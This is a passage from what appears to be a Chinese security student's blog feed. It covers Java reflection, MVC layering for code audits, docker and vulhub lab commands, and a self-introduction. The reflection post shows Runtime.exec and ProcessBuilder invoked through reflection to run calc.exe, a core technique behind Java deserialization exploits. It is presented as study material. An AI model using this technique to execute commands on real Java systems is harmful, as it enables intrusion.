class="headerlink" title="获取类方法"></a>获取类方法</h4><ol><li>getDeclaredMethods</li></ol><p>返回类或接口声明的所有方法，包括public、protected、private和默认方法，但不包括继承的方法。</p><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> a <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>getMethods</li></ol><p>返回某个类的所有public方法，包括其继承类的public方法。</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">a</span><span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>getMethod</li></ol><p>getMethod方法只能返回一个特定的方法。注意，第二个参数是第一个参数方法的参数，因为exec的参数是String，因此后面要跟上String.class</p><pre class="line-numbers language-java"><code class="language-java">Runtime rt <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method method <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li>getDeclaredMethod</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> a <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同上。</p><h4 id="获取类的成员变量"><a href="#获取类的成员变量" class="headerlink" title="获取类的成员变量"></a>获取类的成员变量</h4><p>四个方法对应上文获取类方法的四个方法。</p><ol><li>getDeclaredFields</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field<span class="token punctuation">[</span><span class="token punctuation">]</span> getDeclaredFields <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>getFields</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field<span class="token punctuation">[</span><span class="token punctuation">]</span> getFields <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>getField</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field getField <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>变量没有参数，因此获取变量自然不需要第二个参数了，注意只能获取public类型的变量。</p><ol start="4"><li>getDeclareField</li></ol><pre class="line-numbers language-java"><code class="language-java">Student student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field getDeclaredField <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h4><p>获取对象都是用newInstance()方法，注意要先获得类对象。</p><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 无参数</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参数构造对象第一种方法："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters_1 <span class="token operator">=</span> <span class="token punctuation">(</span>newInstanceExample<span class="token punctuation">)</span>cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参数构造对象第二种方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters_2 <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 有参数</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参数构造对象第一种方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters_1 <span class="token operator">=</span> <span class="token punctuation">(</span>newInstanceExample<span class="token punctuation">)</span>cls<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参数构造对象第二种方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters_2 <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果构造函数有参数，那么需要调用getConstructor()并且传入参数对应类型的类对象。</p><p>但这个方法有限制：</p><ul><li>待实例化的类的构造函数不能是私有的</li></ul><p>如果有private构造函数则不能实例化。</p><h4 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h4><ol><li>直接通过.调用方法，因此要在实例化对象的基础上获取上。</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample have_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 调用对象的方法</span><span class="token comment" spellcheck="true">// 直接调用</span>no_parameters<span class="token punctuation">.</span><span class="token function">method_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>no_parameters<span class="token punctuation">.</span><span class="token function">method_2</span><span class="token punctuation">(</span><span class="token string">"no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>have_parameters<span class="token punctuation">.</span><span class="token function">method_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>have_parameters<span class="token punctuation">.</span><span class="token function">method_2</span><span class="token punctuation">(</span><span class="token string">"yes!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>invoke调用，因此要在获得类对象的基础上获取方法。</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cls <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.ms08067.newInstance.newInstanceExample"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>newInstanceExample no_parameters <span class="token operator">=</span> newInstanceExample<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Object method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"method_2"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>no_parameters<span class="token punctuation">,</span><span class="token string">"invoke方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>String obj <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"method_1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>no_parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>在学会了invoke调用，接着来学习通过反射执行系统命令。</p><h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>Runtime这个类有exec可以调用系统命令，因此我们可以加载Runtime这个类。</p><p>读一下Runtime源码，就会发现Runtime的构造方法是静态的，因此无法通过newInstance实例化Runtime，可以自己去试一下，new Runtime会报错。而正确的获得实例化对象的方法是Runtime.getRuntime()【getRuntime方法是静态的】</p><p>因此，<em>第一种方法</em>：</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>clazz.getMethod(“getRuntime”).invoke(clazz)通过这段代码调用getRuntime获得对象，然后传进invoke里进而执行exec函数。</strong></p><p>如果不调用getRuntime，也可以通过getDeclaredConstructor并且设置作用域执行，<em>第二种方法</em>：</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Constructor m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h5><p>ProcessBuilder这个类的构造方法是public的，一个支持参数为LIst，另一个支持String。并且它的start方法能够执行命令，因此也可以通过ProcessBuilder执行命令。</p><p><em>第一种方法：</em></p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>List<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><em>第二种方法：</em></p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反射 </tag>
            
            <tag> Java安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计基础—架构</title>
      <link href="/2021/11/12/java-dai-ma-shen-ji-ji-chu-jia-gou/"/>
      <url>/2021/11/12/java-dai-ma-shen-ji-ji-chu-jia-gou/</url>
      
        <content type="html"><![CDATA[<blockquote><p>架构的目的就是分层，使得职能分离。</p></blockquote><h4 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h4><ul><li>M 代表 模型（Model）：用来取数据的，我的理解是充当DAO层以及POJO这些。</li><li>V 代表 视图（View）：负责页面展示。</li><li>C 代表 控制器（Controller) ：处理逻辑，控制页面跳转。</li></ul><p>这样的目的主要是把View和Model分离，改样式就动View层，Controller负责逻辑，也就是与V和M之间的联系。</p><h4 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h4><p>可以看到MVC分离的还不够细化，因此SpringMVC实现了把控制器分为控制层以及业务层（实际上咱现在用的基本都是SpringMVC以及SpringBoot这种）</p><p>SpringMVC：视图层调用控制层，控制层调用业务层，业务层调用数据访问层。</p><p><strong>数据访问层</strong>：data access object(DAO)，DAO就是封装实体类在数据库中增删改查的操作。</p><p><strong>业务层</strong>：用来写业务逻辑的<br>对于Service，就是 Servlet 和 Dao 层之间缓冲的层。通过这一层来进行解耦，使得 Dao 层内的变化不会直接影响到 Servlet 层。</p><p><strong>控制层</strong>：MVC中的Controller，用于处理前端页面跳转，调用业务层实现前端页面动态数据的展示。</p><p><strong>视图层</strong>：页面展示。</p><h4 id="JAVAEE分层模型"><a href="#JAVAEE分层模型" class="headerlink" title="JAVAEE分层模型"></a>JAVAEE分层模型</h4><p>就是SpringMVC，除此之外多了一个DO。<br><strong>Domain Object(领域对象)层</strong></p><p>DO是从现实世界中抽象出来的有形或无形的业务实体。</p><p>说白了像一个entity对应一张表叫DO。</p><p><strong>DAO(数据访问对象)层</strong><br>DAO实现了对数据库的CRUD等常见操作。</p><p><strong>Service(业务逻辑)层</strong><br>实现了系统所需要的业务逻辑方法。</p><p><strong>Controller(控制器)层</strong><br>本层由一系列控制器组成，这些控制器用于拦截用户的请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的View组件转发。</p><p><strong>View(表现层)层</strong><br>页面展示。</p><p>分层模型图如下：</p><p><img src="https://img-blog.csdnimg.cn/3a9d1d1175bf4645b35363b16a857e90.png#pic_center" alt="出自JAVA代码安全审计"></p><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p>1.Java代码安全审计（入门篇）                徐焱</p><p>2.<a href="https://blog.csdn.net/weixin_45442296/article/details/123111903">https://blog.csdn.net/weixin_45442296/article/details/123111903</a>      JavaRange</p><p>3.<a href="https://blog.csdn.net/qq_43391574/article/details/110944815">https://blog.csdn.net/qq_43391574/article/details/110944815</a>             落雨青石街</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全基础 </tag>
            
            <tag> MVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基础命令学习</title>
      <link href="/2021/11/05/docker-ji-chu-ming-ling-xue-xi/"/>
      <url>/2021/11/05/docker-ji-chu-ming-ling-xue-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><pre class="line-numbers language-shell"><code class="language-shell">docker search xxxdocker search --filter=STARS=1000       #过滤，指定搜索stars大于1000的镜像<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>search指令可以搜索指定名称或者仓库的镜像的信息。</p><ol><li>STARS: 镜像的stars—越高越受欢迎，</li><li>OFFICIAL: 是否是官方提供的</li><li>AUTOMATED:  是不是自动化的</li></ol><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><pre class="line-numbers language-shell"><code class="language-shell">docker pull xxxdocker pull xxx:tag       #指定版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把指定镜像拉到本地仓库，默认为拉取最新版本。可以通过[镜像:版本号]的形式指定对应版本号的镜像下载，例如：docker pull mysql:5.6.50</p><h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><pre class="line-numbers language-shell"><code class="language-shell">docker images || docker images -a  #查看镜像所有信息docker images -aq                  #查看镜像id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>REPOSITORY: 镜像仓库名</li><li>TAG:                镜像标签</li><li>IMAGE ID:       镜像id</li><li>CREATED:          镜像创建时间</li><li>SIZE:                镜像大小</li></ol><h4 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker run xxx      #指定xxx镜像生成容器docker run -p 8080:8080 -d xxx  #容器内部8080端口映射到本地8080端口，并守护进程后台运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>-p：容器内部端口绑定到指定的主机端口</p></li><li><p>-P：容器内部端口随机映射到主机的端口</p></li><li><p>-t：提供终端输入</p></li><li><p>-i：提供交互</p></li><li><p>-d：容器在后台运行</p></li></ul><h4 id="查看镜像状态"><a href="#查看镜像状态" class="headerlink" title="查看镜像状态"></a>查看镜像状态</h4><pre class="line-numbers language-shell"><code class="language-shell">docker ps          #查看正在运行中的的容器docker ps -a       #查看所有容器docker ps -q       #看正在运行中的的容器：仅列出编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker stop xxx      #指定编号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker start XXX         #指定编号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker restart xxx      #指定编号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><pre class="line-numbers language-shell"><code class="language-shell">docker rm xxxxxxxxxx      # 删除指定容器docker rm -f xxxxxxxxxx  # 强制删除运行中的容器docker rm -f $(docker ps -aq) # 迭代删除全部的容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="进入容器的bash"><a href="#进入容器的bash" class="headerlink" title="进入容器的bash"></a>进入容器的bash</h4><pre class="line-numbers language-shell"><code class="language-shell">docker exec -it xxxxx /bin/bash   # 进入到指定容器内部进行修改  开启一个新的终端exit        #退出bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h4><pre class="line-numbers language-shell"><code class="language-shell">cp ./flag xx:/var/www/html/flag      #将当前目录的flag拷贝到指定为xx id的容器/var/www/html/flag中cp xx:/var/www/html/flag .flag #将指定为xx id的容器/var/www/html下的flag文件拷贝到当前目录flag文件中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h4><pre class="line-numbers language-shell"><code class="language-shell">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后就是联动vulhub一键搭环境。</p><h4 id="vulhub一键搭漏洞环境"><a href="#vulhub一键搭漏洞环境" class="headerlink" title="vulhub一键搭漏洞环境"></a>vulhub一键搭漏洞环境</h4><pre class="line-numbers language-shell"><code class="language-shell">#首先进入对应漏洞环境的文件夹Docker-compose up -d  #根据docker-compose.yml自动拉取容器并启动。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>tomcat8的docker-compose.yml:</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span> <span class="token key atrule">tomcat</span><span class="token punctuation">:</span>   <span class="token key atrule">image</span><span class="token punctuation">:</span> vulhub/tomcat<span class="token punctuation">:</span><span class="token number">8.0</span>   <span class="token key atrule">volumes</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> ./tomcat<span class="token punctuation">-</span>users.xml<span class="token punctuation">:</span>/usr/local/tomcat/conf/tomcat<span class="token punctuation">-</span>users.xml    <span class="token punctuation">-</span> ./context.xml<span class="token punctuation">:</span>/usr/local/tomcat/webapps/manager/META<span class="token punctuation">-</span>INF/context.xml    <span class="token punctuation">-</span> ./context.xml<span class="token punctuation">:</span>/usr/local/tomcat/webapps/host<span class="token punctuation">-</span>manager/META<span class="token punctuation">-</span>INF/context.xml   <span class="token key atrule">ports</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token string">"8080:8080"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自我介绍</title>
      <link href="/2021/10/31/zi-wo-jie-shao/"/>
      <url>/2021/10/31/zi-wo-jie-shao/</url>
      
        <content type="html"><![CDATA[<p>坐标北京，刚刚保研至中科院信工所。大概是在实习的时候对web安全产生了浓厚的兴趣，挖洞原来这么好玩~~</p><p>后来看了代码审计以及白日梦组长的Java安全分享，又觉得代审好好玩~~</p><p>总的来说目前有Java代审和挖洞这两个方向，今后就打算点这两个技能点了。</p><p>最终的梦想肯定是成为安全研究员，并且做出一些有用的工作（黑掉美国白宫算吗）。</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 关于Squirt1e </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
